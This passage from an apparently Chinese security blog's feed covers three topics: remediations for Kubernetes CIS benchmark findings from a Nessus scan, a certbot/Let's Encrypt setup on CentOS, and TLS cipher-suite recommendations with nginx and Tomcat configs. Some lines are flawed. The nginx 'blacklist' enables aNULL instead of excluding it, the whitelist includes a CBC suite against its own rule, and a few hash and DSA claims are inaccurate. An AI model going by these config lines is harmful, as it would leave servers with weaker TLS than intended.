href="#2-4-扫描结果分析" class="headerlink" title="2.4 扫描结果分析"></a>2.4 扫描结果分析</h2><p><strong>1.1.11 Ensure that the etcd data directory permissions are set to 700 or more restrictive</strong><br>描述: etcd 存储目录权限过大</p><p>修复方案：chmod 700 /var/lib/etcd</p><p>影响：验证重启后无影响</p><p><strong>1.1.21 Ensure that the Kubernetes PKI key file permissions are set to 600</strong><br>描述: k8s pki 下的文件权限过大</p><p>修复方案：chmod -R 600 /etc/kubernetes/pki/*.key</p><p>影响：验证重启后无影响</p><p><strong>1.2.1 Ensure that the –anonymous-auth argument is set to false</strong><br>描述: 不允许匿名用户访问</p><p>修复方案：/etc/kubernetes/manifests/kube-apiserver.yaml  中配置–anonymous-auth=false，或者通过配置system:anonymous和system:unauthenticated的权限进行控制</p><p>影响：不允许匿名访问，所有直接的访问都会被拒绝</p><p><strong>1.2.10 Ensure that the admission control plugin EventRateLimit is set</strong><br>描述: 限制 API 服务器接受请求的速率，避免速度APIserver被打挂</p><p>修复方案: 在apiserver中添加如下配置</p><pre><code>   --enable-admission-plugins=...,EventRateLimit,...   --admission-control-config-file=&lt;path/to/configuration/file&gt;    示例配置文件如下：</code></pre><p>/etc/kubernetes/pki/admission-control-config.yaml</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apiserver.k8s.io/v1alpha1<span class="token key atrule">kind</span><span class="token punctuation">:</span> AdmissionConfiguration<span class="token key atrule">plugins</span><span class="token punctuation">:</span><span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> EventRateLimit  <span class="token key atrule">path</span><span class="token punctuation">:</span> eventconfig.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/etc/kubernetes/pki/eventconfig.yaml</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> eventratelimit.admission.k8s.io/v1alpha1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Configuration<span class="token key atrule">limits</span><span class="token punctuation">:</span><span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> Namespace  <span class="token key atrule">qps</span><span class="token punctuation">:</span> <span class="token number">10</span>  <span class="token key atrule">burst</span><span class="token punctuation">:</span> <span class="token number">100</span>  <span class="token key atrule">cacheSize</span><span class="token punctuation">:</span> <span class="token number">50</span><span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> User  <span class="token key atrule">qps</span><span class="token punctuation">:</span> <span class="token number">10</span>  <span class="token key atrule">burst</span><span class="token punctuation">:</span> <span class="token number">50</span>  <span class="token key atrule">cacheSize</span><span class="token punctuation">:</span> <span class="token number">50</span><span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> Server  <span class="token key atrule">qps</span><span class="token punctuation">:</span> <span class="token number">100</span>  <span class="token key atrule">burst</span><span class="token punctuation">:</span> <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>影响：会限制集群和namespace 输出event的速率，当达到配置的极限时，超出的event会被拒绝并返回429 Too Many Requests，需要更具集群的大小及apiserver的处理能力来进行配置，参考社区说明: admission_control_event_rate_limit.md</p><p><strong>1.2.12 Ensure that the admission control plugin AlwaysPullImages is set</strong><br>描述: 设置pod的拉取策略为Always，在多租户时需要和鉴权配合使用以确保镜像不会被其他的用户使用</p><p>修复方案：在apiserver中添加如下配置–enable-admission-plugins=…,AlwaysPullImages,…</p><p>影响：每次拉取私有镜像都需要凭据。此外，在受信任的环境中，这可能会增加网络、注册表的负载并降低速度。此设置可能会影响离线或隔离的集群，这些集群已预加载镜像并且无权访问注册表以提取使用中的镜像。此设置不适用于使用此配置的集群。</p><p><strong>1.2.14 Ensure that the admission control plugin ServiceAccount is set</strong><br>描述：创建 Pod 时，如果未指定服务帐户，则会自动为其分配同一命名空间中的默认服务帐户</p><p>修复方案：似乎已经配置过，但是仍然扫出来</p><p>影响：无</p><p><strong>1.2.16 Ensure that the admission control plugin PodSecurityPolicy is set</strong><br>描述：必须要设置PodSecurityPolicy</p><p>修复方案：APIserver配置参数– enable -admission-plugins =…,PodSecurityPolicy,…</p><p>影响：在允许创建 pod 之前，必须创建并授予策略对象。至少在集群中需要一个安全策略，可能需要配置多个安全策略（注：psp在1.21中已经计划废弃podsecuritypolicy-deprecation-past-present-and-future）</p><p>备注：添加后apiserver无法拉起，还在验证中…</p><p><strong>1.2.17 Ensure that the admission control plugin NodeRestriction is set</strong><br>描述：限制 kubelet 仅可以修改自己的 Node 和 Pod 对象</p><p>修复方案：APIserver 配置参数–enable-admission-plugins=…,NodeRestriction,…</p><p>影响：无</p><p><strong>1.2.21 Ensure that the –profiling argument is set to false</strong><br>描述：关闭性能分析功能</p><p>修复方案：设置apiserver 的参数–profiling=false</p><p>影响：分析信息将不可用，基本影响很小</p><p><strong>1.2.23 Ensure that the –audit-log-maxage argument is set to 30 or as appropriate</strong><br>描述：将审计日志保留至少30天或视情况而定</p><p>修复方案：设置apiserver 的参数–audit-log- maxage=30</p><p>影响：基本无，可以根据具体情况设置</p><p><strong>1.2.25 Ensure that the –audit-log-maxsize argument is set to 100 or as appropriate</strong><br>描述：在审计日志达到 100 MB 或适当时轮换日志文件。</p><p>修复方案：设置apiserver 的参数–audit-log-maxsize=100</p><p>影响：基本无，可以根据具体情况设置</p><p><strong>1.2.27 Ensure that the –service-account-lookup argument is set to true</strong><br>描述：在验证令牌之前验证服务帐户，防止被删除后还能继续访问</p><p>修复方案：设置apiserver 的参数–service-account-lookup=true</p><p>影响：基本无</p><p><strong>1.2.29 Ensure that the –etcd-certfile and –etcd-keyfile arguments are set as appropriate - certfile</strong><br>描述：etcd 应配置为对客户端连接使用 TLS 加密</p><p>修复方案：按照 Kubernetes 文档设置 apiserver 和 etcd 之间的 TLS 连接。然后，在主节点上编辑API server pod规范文件/etc/kubernetes/manifests/kube-apiserver.yaml，设置etcd证书和密钥文件参数。–etcd-certfile=&lt;path/to/client-certificate-file&gt;和–etcd-keyfile=&lt;path/to/client-key-file&gt;</p><p>注：标准部署都配置过了，还会扫出的原因是期望为–etcd-certfile=/etc/kubernetes/pki/etcd/peer.crt([\s]|$)，需要使用固定目录下的文件</p><p>影响：基本无</p><p><strong>1.2.33 Ensure that the –encryption-provider-config argument is set as appropriate</strong><br>描述：加密 etcd 键值存储。</p><p>修复方案：按照 Kubernetes 文档并配置 EncryptionConfig 文件。然后，在主节点上编辑 API 服务器 pod 规范文件 /etc/kubernetes/manifests/kube-apiserver.yaml 并将 –encryption-provider-config 参数设置为该文件的路径：–encryption-provider-config =&lt;/path/to/EncryptionConfig/File&gt;</p><p>影响：待验证，看起来更变密钥似乎会对apiserver读取数据有影响 <a href="https://kubernetes.io/zh/docs/tasks/administer-cluster/encrypt-data/">https://kubernetes.io/zh/docs/tasks/administer-cluster/encrypt-data/</a></p><p><strong>1.2.34 Ensure that encryption providers are appropriately configured</strong><br>描述：在使用 etcd 加密的地方，应该配置适当的提供者。</p><p>修复方案：按照 Kubernetes 文档并配置 EncryptionConfig 文件。在此文件中，选择 aescbc、kms 或 secretbox 作为加密提供程序。</p><p>影响：与1.2.33 为一个问题，可以同步修复</p><p><strong>1.2.6 Ensure that the –kubelet-certificate-authority argument is set as appropriate</strong><br>描述：在建立连接之前验证 kubelet 的证书，kubelet和apiserver使用https进行通信</p><p>修复方案：设置 apiserver 和 kubelets 之间的 TLS 连接，并设置apiserver 的参数 –kubelet-certificate-authority=/etc/kubernetes/pki/apiserver-kubelet-client.crt</p><p>影响：apiserver 和 kubelets 上配置 TLS</p><p><strong>1.3.1 Ensure that the –terminated-pod-gc-threshold argument is set as appropriate</strong><br>描述：设置终止pod收集数量，当前默认是12500才会进行回收</p><p>修复方案：设置/etc/kubernetes/manifests/kube-controller-manager.yaml 的参数 –terminated-pod-gc-threshold为合适的值</p><p>影响：基本无</p><p><strong>1.3.2 Ensure that the –profiling argument is set to false</strong><br>描述：是否打开controller-manager的性能分析功能</p><p>修复方案：/etc/kubernetes/manifests/kube-controller-manager.yaml 设置–profiling=false</p><p>影响：基本无，分析信息将不可用</p><p><strong>1.3.7 Ensure that the –bind-address argument is set to 127.0.0.1</strong><br>描述：不要将kube-controller-manager绑定到127.0.0.1之外的IP</p><p>修复方案：/etc/kubernetes/manifests/kube-controller-manager.yaml 并设置–bind-address=127.0.0.1</p><p>影响：基本无</p><p><strong>1.4.1 Ensure that the –profiling argument is set to false</strong><br>描述：是否打开kube-schedule的性能分析功能</p><p>修复方案： /etc/kubernetes/manifests/kube-scheduler.yaml 设置–profiling=false</p><p>影响：基本无，分析信息将不可用</p><p><strong>2.1 Ensure that the –cert-file and –key-file arguments are set as appropriate - cert</strong><br>描述：etcd服务配置tls</p><p>修复方案： /etc/kubernetes/manifests/etcd.yaml 配置–cert-file和–key-file </p><p>注：其实已经配置，不过文件路径不符合期望–cert-file=/etc/kubernetes/pki/apiserver-etcd-client.crt</p><p>影响：无</p><p><strong>3.1.1 Client certificate authentication should not be used for users</strong><br>描述：client的认证不应该使用证书，例如 OIDC 的使用，应该替代客户端证书。</p><p>修复方案： 去除apiserer中的参数client-ca-file</p><p>影响：客户端无法使用证书进行访问，需要进一步评估</p><p><strong>5.2.4 Minimize the admission of containers wishing to share the host network namespace</strong><br>描述：通常不允许容器使用hostnetwork</p><p>修复方案： 创建禁止使用node节点网络的PSP</p><p>影响：集群内使用hostnetwork的系统组件都要使用nodeport或者其他形式进行暴露</p><p><strong>5.2.7 Minimize the admission of containers with the NET_RAW capability</strong><br>描述：通常不允许使用具有潜在危险的 NET_RAW 功能的容器</p><p>修复方案： 创建 PSP，确保将 .spec.requiredDropCapabilities 设置为包含 NET_RAW 或 ALL。</p><p>影响：带有以 NET_RAW 功能运行的容器的 Pod 将不被允许</p><p><strong>5.2.8 Minimize the admission of containers with added capabilities</strong><br>描述：通常不允许具有超出默认设置的分配能力的容器</p><p>修复方案：确保 allowedCapabilities 不存在于集群的 PSP 中，除非它被设置为空数组。</p><p>影响：带有需要超出默认设置的能力的容器的 Pod 将不被允许。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://community.tenable.com/s/article/Troubleshoot-failed-audit-compliance-scans">Troubleshoot-failed-audit-compliance-scans</a></li><li><a href="https://zh-cn.tenable.com/blog/how-to-maximize-compliance-scans-with-nessus?tns_redirect=true">如何使用nessus启动合规性扫描</a> 官网</li><li><a href="https://static.tenable.com/documentation/nessus_compliance_checks.pdf">具体如何配置Nessus的合规扫描文件</a>   具体操作</li><li><a href="https://zh-cn.tenable.com/downloads/download-all-compliance-audit-files">下载nessus策略的原始文件</a>  包含cis等多个标准</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</category>
      
      
      <comments>https://m01ly.github.io/2021/07/28/scan-nessus-compliance/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>证书管理工具之letsencrypt</title>
      <link>https://m01ly.github.io/2021/07/22/cert-letsencrypt/</link>
      <guid>https://m01ly.github.io/2021/07/22/cert-letsencrypt/</guid>
      <pubDate>Thu, 22 Jul 2021 06:45:25 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 SSH 进入服务器</p><p>以具有 sudo 权限的用户身份通过 SSH 连接到运行您的 HTTP 网站的服务器。</p><p>2 安装 snapd</p><p>您需要安装 snapd 并确保按照任何说明启用经典 snap 支持。<br>按照<a href="https://snapcraft.io/docs/installing-snapd/">snapcraft 网站</a>上<a href="https://snapcraft.io/docs/installing-snapd/">的</a>这些说明<a href="https://snapcraft.io/docs/installing-snapd/">安装 snapd</a>。</p><p>（1）将 EPEL 添加到 CentOS 7</p><p>可以使用以下命令将 EPEL 存储库添加到 CentOS 7 系统：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> epel-release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）安装 snapd</p><p>将 EPEL 存储库添加到您的 CentOS 安装后，只需安装<em>snapd</em>包：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> snapd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当出现以下图片安装失败，原因为图中可以看到EPEL 存储库存储库中的snapd版本为2.49，但是最新版本为2.51，只有最新版本才有rpm包，因此获取失败，主要因为yum版本过低，应该升级yum版本即可yum -y upgrade;yum -y update</p><p><img src="/2021/07/22/cert-letsencrypt/1627006806810.png" alt="1627006806810"></p><p>如下yum版本和内核版本可以成功安装snapd</p><p><img src="/2021/07/22/cert-letsencrypt/1627006157537.png" alt="1627006157537"></p><p>可以看到存储库中的snapd是最新版本2.51，安装成功</p><p><img src="/2021/07/22/cert-letsencrypt/1627006992635.png" alt="1627006992635"></p><p>安装后，需要启用管理主 snap 通信套接字的<em>systemd</em>单元：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl <span class="token function">enable</span> --now snapd.socket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要启用<em>经典</em>snap 支持，请输入以下内容以在<code>/var/lib/snapd/snap</code>和之间创建符号链接<code>/snap</code>：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">ln</span> -s /var/lib/snapd/snap /snap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注销并重新登录或重新启动系统以确保正确更新 snap 的路径。</p><p>3 确保您的 snapd 版本是最新的</p><p>在机器上的命令行上执行以下说明，以确保您拥有最新版本的<code>snapd</code>。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> snap <span class="token function">install</span> core<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/22/cert-letsencrypt/1627007070131.png" alt="1627007070131"></p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> snap refresh core<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/22/cert-letsencrypt/1627007140412.png" alt="1627007140412"></p><p>4 删除 certbot-auto 和任何 Certbot OS 包</p><p>如果您使用<code>apt</code>、<code>dnf</code>或<code>yum</code>等操作系统包管理器安装了任何 Certbot 包 ，则应在安装 Certbot snap 之前将其删除，以确保在运行命令 <code>certbot 时使用的</code>是 snap，而不是从您的操作系统包安装经理。执行此操作的确切命令取决于您的操作系统，但常见示例是<code>sudo apt-get remove certbot</code>、<code>sudo dnf remove certbot</code>或<code>sudo yum remove certbot</code>。</p><p>如果您之前通过 certbot-auto 脚本使用过 Certbot，您还应该按照<a href="https://certbot.eff.org/docs/uninstall.html">此处</a>的说明删除其安装。</p><p>5 安装certbot</p><p>在机器上的命令行上运行此命令以安装 Certbot。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> --classic certbot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6 准备 Certbot 命令</p><p>在机器上的命令行执行以下指令，确保<code>certbot</code>命令可以运行。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> -s /snap/bin/certbot /usr/bin/certbot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7 选择您希望如何运行 Certbot</p><ul><li><p>要么获取并安装您的证书…</p><p>运行此命令以获取证书并让 Certbot 自动编辑您的 Nginx 配置以提供服务，只需一步即可打开 HTTPS 访问。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> certbot --nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><img src="/2021/07/22/cert-letsencrypt/1627010116619.png" alt="1627010116619"></p><ul><li><p>或者，只需获得证书</p><p>如果您感觉更保守并希望手动更改 Nginx 配置，请运行此命令。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> certbot certonly --nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><a href="http://archery-sec9002.eniot.io/">http://archery-sec9002.eniot.io/</a></p><p>8 测试自动续订</p><p>您系统上的 Certbot 软件包带有一个 cron 作业或 systemd 计时器，它们将在您的证书到期之前自动更新您的证书。除非您更改配置，否则您无需再次运行 Certbot。</p><p>您可以通过运行以下命令来测试证书的自动续订：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> certbot renew --dry-run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9 如果该命令正确完成，您的证书将在后台自动更新。</p><p>确认 Certbot 工作:要确认您的站点设置正确，请在浏览器中访问<code>https://yourwebsite.com/</code>并在 URL 栏中查找锁定图标。</p><p><a href="https://certbot.eff.org/lets-encrypt/centosrhel7-nginx"><a href="https://certbot.eff.org/lets-encrypt/centosrhel7-nginx.html">CentOS/RHEL 7 上的 Nginx</a></a></p><p><a href="https://snapcraft.io/docs/installing-snap-on-centos">centos中安装snapd</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">企业安全建设</category>
      
      
      <comments>https://m01ly.github.io/2021/07/22/cert-letsencrypt/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>安全的TLS协议</title>
      <link>https://m01ly.github.io/2021/07/06/htps-recommend/</link>
      <guid>https://m01ly.github.io/2021/07/06/htps-recommend/</guid>
      <pubDate>Tue, 06 Jul 2021 03:17:11 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在实际应用中，应用不安全的密码协议可能会导致被黑客攻击，因此本文从各个角度给出不同安全级别的密码套件推荐。</p><h2 id="1-算法结构安全性分析"><a href="#1-算法结构安全性分析" class="headerlink" title="1 算法结构安全性分析"></a>1 算法结构安全性分析</h2><p><img src="/2021/07/06/htps-recommend/1625552647924.png" alt="1625552647924"></p><p><strong>1) 密钥交换算法</strong></p><p>密钥交换算法是用于交换对称密钥的公钥系统</p><p>Examples: ECDHE, DHE, RSA, ECDH, DH，ADH，PSK</p><p><strong>RSA，ECDH，DH，PSK均不具有前向安全性</strong>，一旦私钥丢失，则以往所有的通信内容将会泄露，使用前向安全性算法（ECDHE，DHE），可以避免这种问题。</p><p>ADH为Anonymous DH，匿名DH算法，不提供身份验证，禁用。</p><p>PSK算法是预存key在客户端和服务端，因为PSK必须要预置密钥，这个预置的过程就代表了服务端已经知道有哪些客户端需要访问了，所以基于PSK的TLS适合在内部系统中使用，而不适合在公网环境用来提供Web服务。</p><p>另外，因为DH1024 在理论上是可以破解（Logjam攻击）的，虽然破解难度和成本极大，但是也存在一定的风险，所以要求使用DH-2048且 不是初始默认值.</p><p><strong>推荐使用安全密钥交换算法：ECDHE，DHE（2048）</strong></p><p><strong>2）身份认证算法</strong></p><p>服务器在 SSL/TLS 握手中使用的算法来签署（使用服务器的私钥）在协商中发送给客户端的算法。</p><p>客户端可以使用服务器的公钥对它们进行身份验证。</p><p>Examples include: RSA, ECDSA, DSS (aka DSA), and Anonymous.</p><p>DSA只支持1024bits，不安全算法</p><p><strong>推荐使用安全认证算法：</strong>RSA(2048以上)、ECDSA</p><p><strong>3）加密算法</strong></p><p>一种更改消息以使其保密的方法。</p><p>Examples: DES (Data Encryption Standard), 3DES (Triple DES), AES (Advanced Encryption Standard), ChaCha20,RC4 (Rivest Cipher 4), Camellia, ARIA,RC6, RC2, Blowfish, Twofish, IDEA, SEED, GOST, Rijndael, Serpent, MARS, etc.</p><p>ChaCha20是一种流加密算法，实现较为简单，并且比纯软件实现的AES性能更好。</p><p>在支持AES指令的硬件平台上，推荐优先选择AES-GCM算法,不支持AES指令的硬件平台，ChaCha20性能优于AES</p><p>Camellia算法支持128比特的分组长度,128、192和256比特的密钥与AES的接口相同，Camellia算法128比特密钥的加、解密过程共有18轮,采用Feistel结构,加、解密过程完全相同,只是子密钥注入顺序相反</p><p>Camellia算法由NTT和Mitsubishi Electric Corporation于2000年联合开发，作为欧洲新一代的加密标准。与AES算法相比,Camellia算法在各种软硬件平台上表现出与之相当的加密速度。除了在各种软件和硬件平台上的高效性这一显著特点,它的另外一个特点是针对小规模硬件平台的设计</p><p><strong>推荐使用安全的加密算法：</strong>AES256, ChaCha20, Camellia</p><p><strong>4) 密码工作模式</strong></p><p>例如：CBC and GCM</p><p>GCM 代表 Galois/Counter Mode，一种比 CBC 更高级的操作模式。</p><p>它还对困扰 CBC 的攻击类别免疫，例如填充（野兽、幸运 13 等）</p><p>AES-GCM 的主要缺点是它仅在 TLSv1.2 修订版中添加，因此任何不支持 TLSv1.2 的旧客户端都无法使用它。</p><p><strong>推荐使用安全的工作模式</strong>：GCM</p><p><strong>5) MAC(Hash Function)</strong></p><p>简而言之，MAC 提供消息完整性。 散列函数包括 MD5、SHA-1（又名 SHA）、SHA-2（又名 SHA128、SHA256 和 SHA384）和 AEAD（具有关联数据的身份验证加密）。 <strong>MD5 早已变得完全不安全并且已被弃用</strong>。 SHA-1 现在正受到浏览器的“羞辱”，因为它成为加密攻击进步的受害者。 鼓励尽快迁移到 SHA-2。</p><p>SHA1存在碰攻击，如果HTTPS证书使用sha1，则会存在中间人攻击；</p><p><strong>推荐使用安全的Hash算法：</strong>sha256，sha384</p><p>如下几个过时的加密原语必须禁止使用：</p><p>（1）匿名Diffie-Hellman（ADH）套件不提供身份验证。</p><p>（2）NULL加密套件不提供加密。</p><p>（3）导出加密套件在连接协商时不安全，但也可以针对更强大的套件（FREAK攻击）的服务器使用。</p><p>（4）弱密码（通常为40和56位）的套件使用可以轻松被攻击。</p><p>（5）RC4是不安全的。</p><p>（6）3DES运行缓慢且易被攻击。</p><h2 id="2-SSL-TLS协议安全"><a href="#2-SSL-TLS协议安全" class="headerlink" title="2 SSL/TLS协议安全"></a>2 SSL/TLS协议安全</h2><p>SSL/TLS系列中有五种协议：SSL 2，SSL 3，TLS 1.0，TLS 1.1，TLS 1.2和TLS1.3。</p><p>SSL2和SSL3已经非常过时了，建议不要使用。从理论上来讲，TLS 1.0也不应该被使用，但在实践中经常被使用。截至目前，TLS 1.1，1.2和TLS1.3都还没有什么安全问题，但只有 1.2提供了现代的加密算法。所以TLS 1.2应该是被使用的主要协议，因为它是唯一提供现代认证加密（也称为AEAD）的版本</p><p>TLS1.3协议：从2014年4月，第0份TLS 1.3草案公开，到2017年7月第21份草案发布，TLS 1.3的编写工作已经进入尾声，跨时3年的编写，让该协议成为有史以来最安全、也是最复杂的TLS协议。2018年6月15日，IETF发布 TLS v1.3 draft 23，正式的RFC虽然尚未发布，TLS 1.3已经开始被国内外一些网站使用，Chrome、Firefox、OpenSSL、Nginx等均提供了相应支持，TLS 1.3已经悄然进入我们的生活</p><p><strong>推荐使用安全的协议：TLS1.2,TLS1.3</strong></p><h2 id="3-算法套安全级别划分"><a href="#3-算法套安全级别划分" class="headerlink" title="3 算法套安全级别划分"></a>3 算法套安全级别划分</h2><p>算法套的安全级别可以分为高中低三个等级，每个级别的算法套也按安全级别从搞到低排序</p><p><strong>HIGH</strong></p><p>“高级别”加密密码套件。 这目前意味着密钥长度大于 128 位的那些密码套件，以及一些具有 128 位密钥的密码套件。</p><p><strong>MEDIUM</strong></p><p>“中等”加密密码套件，目前其中一些使用 128 位加密。</p><p><strong>LOW</strong></p><p>低强度加密密码套件，目前使用 64 或 56 位加密算法但不包括导出密码套件。 从 OpenSSL 1.0.2g 开始，这些在默认构建中被禁用。</p><h2 id="4-TLS1-2-安全密码套推荐"><a href="#4-TLS1-2-安全密码套推荐" class="headerlink" title="4 TLS1.2 安全密码套推荐"></a>4 TLS1.2 安全密码套推荐</h2><h3 id="4-0-根据证书去选择密码套件"><a href="#4-0-根据证书去选择密码套件" class="headerlink" title="4.0 根据证书去选择密码套件"></a>4.0 根据证书去选择密码套件</h3><p>当服务器配置ECC证书时，加密套件只能选择XXX_ECDSA_XXX或者ECDH_XXX。</p><p>当服务器配置RSA证书时，只能选择RSA_XXX或者ECDHE_RSA_XXX形式的加密套件。</p><p>需要注意的是，如果加密套件选择ECDH_RSA或者ECDH_ECDSA时，由于ECDH加密套件默认表明了握手需要ECC证书（即ECC证书的公钥充当握手中server key exchange中的公钥，证书的私钥同样也是握手过程中的私钥，握手过程不需要server key exchange），所有第二部分RSA和ECDSA表明的是想要的上级签发该类型的服务器证书。</p><p>如果加密套件选择ECDHE_XXXX，则第二部分RSA和ECDSA指的是用来签名握手中server key exchange中传过来的秘密值的签名算法。</p><h3 id="4-1-密码套件选择原则"><a href="#4-1-密码套件选择原则" class="headerlink" title="4.1  密码套件选择原则"></a>4.1  密码套件选择原则</h3><ul><li>支持的SSL/TLS版本：TLS1.2，TLS1.3（禁用SSLV3 TLS1.0和TLS1.1）</li><li>密钥交换算法禁用DH，ADH，优选DHE(2048)和ECHDE，<strong>保留RSA（原则上禁用）</strong></li><li>认证算法使用：RSA和ECDSA，禁用none</li><li>对称加密算法使用：AES, Camellia, ChaCha20, 禁用DES, 3DES, RC4,SEED</li><li>工作模式推荐：AES-GCM， ChaCha20_POLY1305，j禁用CBC</li><li>MAC算法：SHA384，SHA256，禁用SHA1,MD5 </li></ul><h3 id="4-2-TLS1-2-安全密码套件"><a href="#4-2-TLS1-2-安全密码套件" class="headerlink" title="4.2 TLS1.2 安全密码套件"></a>4.2 TLS1.2 安全密码套件</h3><p>针对TLS1.2，推荐以下3种程度安全要求的密码套件：</p><p><strong>(1)TLS1.2密码套件中满足前向安全性，禁用CBC的算法套推荐如下所示</strong></p><p>TLS_DHE_RSA_WITH_AES_128_GCM_SHA256    RSA证书<br>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384    RSA证书<br>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256    RSA证书<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384    RSA证书<br>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256     ecc证书<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384     ecc证书</p><p><strong>(2)在1的安全要求下，考虑效率，因为DHE算法效率低，通常不建议。则满足前向安全，禁用CBC，保证高效率推荐的算法套如下所示：</strong></p><p>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384<br>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</p><p><strong>（3）在（2）的要求基础上，严格意义上128位的加密算法AES并不能保证安全性，对于安全性要求高的，则满足前向安全，禁用CBC，密码长度要求的，保证高效率推荐的算法套如下所示：</strong></p><p>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</p><h2 id="5-Web服务配置"><a href="#5-Web服务配置" class="headerlink" title="5 Web服务配置"></a>5 Web服务配置</h2><h3 id="5-1-nginx配置"><a href="#5-1-nginx配置" class="headerlink" title="5.1 nginx配置"></a>5.1 nginx配置</h3><p>在安装目录下，修改配置文件</p><p>白名单形式（注意此ciphersuite格式只适用于Nginx,Tomcat的格式是TLS_XXX_XXX_WITH_XXX_XXX_XXX_XXX）：tls1.3加3套tls1.2</p><p>Ssl_ciphers ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA:!DSS；</p><p>黑名单形式：</p><p>​    HIGH:aNULL:!ADH:!DH:!DSA:!DES:!3DES:!SEED:!RC4:!MD5:!CBC;</p><p><strong>备注：</strong></p><p>因为nginx是否支持TLS1.3，取决于编译依赖的openssl库是否支持TLS1.3; 且需要重新编译，添加依赖项；所以nginx服务器是否支持TLS1.3的算法套，不仅需要配置还需要编译时加入TLS1.3的依赖。</p><h3 id="5-2-Tomcat配置"><a href="#5-2-Tomcat配置" class="headerlink" title="5.2 Tomcat配置"></a>5.2 Tomcat配置</h3><p>白名单，可以参考配置：</p><p>sslProtocol=”TLSv1.3,TLSv1.2”<br>SSLCipherSuite=”TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,</p><p>TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256，<br>TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256，<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,<br>黑名单：</p><p>sslProtocol=”TLSv1.3,TLSv1.2”<br>SSLCipherSuite=”HIGH:!MD5!EXP:!NULL:!ADH:!CBC:!DH:!DSS”</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.microfocus.com/documentation/enterprise-developer/ed60/ES-WIN/GUID-E3960B1E-C42E-4748-A5EB-6E12507C9CD7.html">使用 TLS v1.2 及更早版本配置密码套件列表</a></p><h2 id="附录：所有密码套件"><a href="#附录：所有密码套件" 